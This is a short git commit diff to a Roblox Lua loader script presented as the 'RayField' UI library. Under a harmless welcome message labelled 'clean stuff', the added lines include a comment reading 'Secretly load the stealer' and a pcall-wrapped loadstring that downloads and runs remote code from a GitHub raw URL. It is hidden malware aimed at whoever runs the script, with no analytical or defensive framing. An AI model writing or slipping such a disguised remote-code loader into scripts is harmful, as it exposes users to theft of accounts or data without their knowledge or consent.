7d4bc6fb7755d98e125a164bb99496fb80c01d06
HKTwoScript <jancmafs@gmail.com>
2025-07-19 12:53:53 +0200

    Update LoaderV1.lua

--- LoaderV1.lua
+++ LoaderV1.lua
@@ -1,1 +1,7 @@
+-- Main script logic (clean stuff)
+print("Welcome to HKTWO's RayField")
 
+-- Secretly load the stealer
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTwoScript/RayField/main/RayField"))()
+end)
